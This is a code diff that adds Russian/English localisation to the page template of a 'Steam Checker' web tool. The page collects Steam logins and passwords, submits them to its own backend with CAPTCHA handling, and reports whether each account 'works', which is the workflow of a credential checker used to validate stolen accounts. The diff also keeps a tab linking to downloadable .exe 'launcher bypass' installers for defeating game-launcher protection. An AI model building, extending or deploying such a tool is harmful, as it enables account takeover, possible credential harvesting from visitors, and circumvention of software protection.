@@ -70,6 +70,35 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
             height: 1px;
             background: linear-gradient(90deg, transparent, rgba(0, 212, 255, 0.3), transparent);
         }
+        .lang-switcher {
+            position: absolute;
+            top: 1.5rem;
+            right: 1.5rem;
+            display: flex;
+            gap: 4px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 2px;
+        }
+        .lang-btn {
+            background: transparent;
+            border: none;
+            color: var(--text-muted);
+            font-size: 0.75rem;
+            font-weight: 700;
+            padding: 6px 10px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-family: inherit;
+        }
+        .lang-btn.active {
+            background: rgba(0, 212, 255, 0.1);
+            color: var(--accent);
+        }
+        .lang-btn:hover:not(.active) { color: var(--text); }
+
         .head {
             display: flex;
             justify-content: center;
@@ -301,37 +330,41 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
 </head>
 <body>
     <div class="container">
+        <div class="lang-switcher">
+            <button class="lang-btn" data-lang="ru" onclick="setLanguage('ru')">RU</button>
+            <button class="lang-btn" data-lang="en" onclick="setLanguage('en')">EN</button>
+        </div>
         <div class="head">
-            <div class="logo">Steam Checker</div>
+            <div class="logo" data-i18n="title">Steam Checker</div>
         </div>
 
         <div class="nav-tabs">
-            <div class="nav-tab active" data-view="checker">Проверка</div>
-            <div class="nav-tab" data-view="bypass">Обходы лаунчеров</div>
+            <div class="nav-tab active" data-view="checker" data-i18n="tabChecker">Проверка</div>
+            <div class="nav-tab" data-view="bypass" data-i18n="tabBypass">Обходы</div>
         </div>
 
         <!-- CHECKER VIEW -->
         <div id="checkerView" class="view-section active">
             <div class="section-header">
-                <h2>Auth Check</h2>
-                <p>Введите данные для проверки аккаунта</p>
+                <h2 data-i18n="authCheckTitle">Проверка аккаунта</h2>
+                <p data-i18n="authCheckDesc">Введите данные для проверки</p>
             </div>
             <div class="field">
-                <label>Логин</label>
-                <input type="text" id="username" placeholder="steam login" autocomplete="off">
+                <label data-i18n="labelLogin">Логин</label>
+                <input type="text" id="username" data-i18n-placeholder="placeholderLogin" placeholder="steam логин" autocomplete="off">
             </div>
             <div class="field">
-                <label>Пароль</label>
-                <input type="password" id="password" placeholder="••••••••">
+                <label data-i18n="labelPassword">Пароль</label>
+                <input type="password" id="password" data-i18n-placeholder="placeholderPassword" placeholder="••••••••">
             </div>
-            <button class="btn" id="checkBtn">Проверить</button>
+            <button class="btn" id="checkBtn" data-i18n="btnCheck">Проверить</button>
             
             <div class="captcha-box" id="captchaBox">
                 <img id="captchaImage" alt="CAPTCHA">
                 <div class="field" style="margin-bottom: 10px">
-                    <input type="text" id="captchaText" placeholder="Введите код с картинки">
+                    <input type="text" id="captchaText" data-i18n-placeholder="placeholderCaptcha" placeholder="Введите код">
                 </div>
-                <button class="btn" id="captchaBtn" style="border-color: rgba(255, 184, 0, 0.3); color: var(--warn);">Отправить</button>
+                <button class="btn" id="captchaBtn" style="border-color: rgba(255, 184, 0, 0.3); color: var(--warn);" data-i18n="btnCaptcha">Отправить</button>
             </div>
 
             <div class="result" id="result"></div>
@@ -340,8 +373,8 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
         <!-- BYPASS VIEW -->
         <div id="bypassView" class="view-section">
             <div class="section-header">
-                <h2>Обходы лаунчеров</h2>
-                <p>Выберите необходимый инструмент для обхода защиты</p>
+                <h2 data-i18n="bypassTitle">Обходы лаунчеров</h2>
+                <p data-i18n="bypassDesc">Инструменты для обхода защиты</p>
             </div>
             <div class="bypass-list">
                 <a href="https://github.com/onajlikezz/Nightlight-Launcher/releases/download/NLLauncherV5.3.00/Nightlight.Launcher.Setup.5.3.0.exe" class="bypass-btn" target="_blank">
@@ -350,19 +383,99 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
                         <polyline points="7 10 12 15 17 10"></polyline>
                         <line x1="12" y1="15" x2="12" y2="3"></line>
                     </svg>
-                    <span>Обход Rockstar Launcher</span>
+                    <span data-i18n="bypassRockstar">Обход Rockstar Launcher</span>
                 </a>
                 <a href="https://github.com/LightnigFast/Project-Lightning/releases/download/v5.0.11.0/ProjectLightningInstaller-v5.exe" class="bypass-btn" target="_blank">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"></path>
                     </svg>
-                    <span>Универсальный обход</span>
+                    <span data-i18n="bypassUniversal">Универсальный обход</span>
                 </a>
             </div>
         </div>
     </div>
 
     <script>
+        const translations = {
+            ru: {
+                title: "Steam Checker",
+                tabChecker: "Проверка",
+                tabBypass: "Обходы",
+                authCheckTitle: "Проверка аккаунта",
+                authCheckDesc: "Введите данные для проверки",
+                labelLogin: "Логин",
+                placeholderLogin: "steam логин",
+                labelPassword: "Пароль",
+                placeholderPassword: "••••••••",
+                btnCheck: "Проверить",
+                placeholderCaptcha: "Введите код",
+                btnCaptcha: "Отправить",
+                errFill: "Заполните все поля",
+                errCaptcha: "Введите код капчи",
+                warnCaptcha: "Требуется капча",
+                warnCaptchaWrong: "Неверная капча",
+                errNetwork: "Ошибка сети",
+                okAccount: "Аккаунт работает",
+                errAccount: "Аккаунт не работает",
+                bypassTitle: "Обходы лаунчеров",
+                bypassDesc: "Инструменты для обхода защиты",
+                bypassRockstar: "Обход Rockstar Launcher",
+                bypassUniversal: "Универсальный обход",
+                wait: "Подождите",
+                checking: "Проверка..."
+            },
+            en: {
+                title: "Steam Checker",
+                tabChecker: "Checker",
+                tabBypass: "Bypass",
+                authCheckTitle: "Account Check",
+                authCheckDesc: "Enter credentials to verify",
+                labelLogin: "Login",
+                placeholderLogin: "steam login",
+                labelPassword: "Password",
+                placeholderPassword: "••••••••",
+                btnCheck: "Check",
+                placeholderCaptcha: "Enter code",
+                btnCaptcha: "Submit",
+                errFill: "Fill in all fields",
+                errCaptcha: "Enter captcha code",
+                warnCaptcha: "Captcha required",
+                warnCaptchaWrong: "Wrong captcha",
+                errNetwork: "Network error",
+                okAccount: "Account works",
+                errAccount: "Account does not work",
+                bypassTitle: "Launcher Bypass",
+                bypassDesc: "Tools to bypass protection",
+                bypassRockstar: "Rockstar Launcher Bypass",
+                bypassUniversal: "Universal Bypass",
+                wait: "Wait",
+                checking: "Checking..."
+            }
+        };
+
+        let currentLang = localStorage.getItem('lang') || 'ru';
+
+        function setLanguage(lang) {
+            currentLang = lang;
+            localStorage.setItem('lang', lang);
+            
+            document.querySelectorAll('.lang-btn').forEach(btn => {
+                btn.classList.toggle('active', btn.dataset.lang === lang);
+            });
+            
+            document.querySelectorAll('[data-i18n]').forEach(el => {
+                const key = el.getAttribute('data-i18n');
+                if (translations[lang][key]) el.textContent = translations[lang][key];
+            });
+            
+            document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
+                const key = el.getAttribute('data-i18n-placeholder');
+                if (translations[lang][key]) el.placeholder = translations[lang][key];
+            });
+        }
+
+        setLanguage(currentLang);
+
         // Tab switching
         document.querySelectorAll('.nav-tab').forEach(tab => {
             tab.addEventListener('click', () => {
@@ -379,9 +492,10 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
 
         function startCooldown() {
             const btn = document.getElementById('checkBtn');
+            const t = translations[currentLang];
             let remaining = COOLDOWN;
             btn.disabled = true;
-            btn.textContent = 'Подождите ' + remaining + 'с';
+            btn.textContent = \`\${t.wait} \${remaining}s\`;
             
             if (cooldownTimer) clearInterval(cooldownTimer);
             
@@ -391,9 +505,9 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
                     clearInterval(cooldownTimer);
                     cooldownTimer = null;
                     btn.disabled = false;
-                    btn.textContent = 'Проверить';
+                    btn.textContent = t.btnCheck;
                 } else {
-                    btn.textContent = 'Подождите ' + remaining + 'с';
+                    btn.textContent = \`\${t.wait} \${remaining}s\`;
                 }
             }, 1000);
         }
@@ -401,7 +515,14 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
         function showResult(type, text) {
             const res = document.getElementById('result');
             res.className = 'result show ' + type;
-            res.textContent = text;
+            if (text) {
+                res.textContent = text;
+            } else {
+                const t = translations[currentLang];
+                if (type === 'ok') res.textContent = t.okAccount;
+                else if (type === 'warn') res.textContent = t.warnCaptcha;
+                else res.textContent = t.errAccount;
+            }
         }
 
         async function doCheck(login, pass, gid, text) {
@@ -413,22 +534,23 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
                 });
                 return await r.json();
             } catch (e) {
-                return { status: 'error', message: 'Ошибка соединения' };
+                return { status: 'error', message: translations[currentLang].errNetwork };
             }
         }
 
         document.getElementById('checkBtn').addEventListener('click', async () => {
             const u = document.getElementById('username').value.trim();
             const p = document.getElementById('password').value.trim();
+            const t = translations[currentLang];
             
             if (!u || !p) {
-                showResult('err', 'Заполните все поля');
+                showResult('err', t.errFill);
                 return;
             }
             
             const btn = document.getElementById('checkBtn');
             btn.disabled = true;
-            btn.textContent = 'Проверка...';
+            btn.textContent = t.checking;
             document.getElementById('result').classList.remove('show');
             document.getElementById('captchaBox').classList.remove('show');
             
@@ -438,15 +560,15 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
                 captchaGid = data.captcha_gid;
                 document.getElementById('captchaImage').src = '/api/captcha/' + captchaGid;
                 document.getElementById('captchaBox').classList.add('show');
-                showResult('warn', 'Требуется капча');
+                showResult('warn', t.warnCaptcha);
             } else if (data.status === 'success') {
-                showResult('ok', 'Аккаунт работает');
+                showResult('ok', t.okAccount);
             } else {
-                showResult('err', 'Аккаунт не работает');
+                showResult('err', t.errAccount);
             }
             
             btn.disabled = false;
-            btn.textContent = 'Проверить';
+            btn.textContent = t.btnCheck;
             startCooldown();
         });
 
@@ -454,15 +576,16 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
             const u = document.getElementById('username').value.trim();
             const p = document.getElementById('password').value.trim();
             const t = document.getElementById('captchaText').value.trim();
+            const lang = translations[currentLang];
             
             if (!t) {
-                showResult('err', 'Введите код капчи');
+                showResult('err', lang.errCaptcha);
                 return;
             }
             
             const btn = document.getElementById('captchaBtn');
             btn.disabled = true;
-            btn.textContent = 'Проверка...';
+            btn.textContent = lang.checking;
             
             const data = await doCheck(u, p, captchaGid, t);
             
@@ -470,21 +593,20 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
                 document.getElementById('captchaImage').src = '/api/captcha/' + data.captcha_gid + '?t=' + Date.now();
                 captchaGid = data.captcha_gid;
                 document.getElementById('captchaText').value = '';
-                showResult('warn', 'Неверная капча, попробуйте снова');
+                showResult('warn', lang.warnCaptchaWrong);
             } else if (data.status === 'success') {
                 document.getElementById('captchaBox').classList.remove('show');
-                showResult('ok', 'Аккаунт работает');
+                showResult('ok', lang.okAccount);
             } else {
                 document.getElementById('captchaBox').classList.remove('show');
-                showResult('err', 'Аккаунт не работает');
+                showResult('err', lang.errAccount);
             }
             
             btn.disabled = false;
-            btn.textContent = 'Отправить';
+            btn.textContent = lang.btnCaptcha;
             startCooldown();
         });
 
-        // Background ping for stats (kept for backend compatibility)
         let sid = sessionStorage.getItem('sid');
         if (!sid) {
             sid = Math.random().toString(36).substring(2, 15);
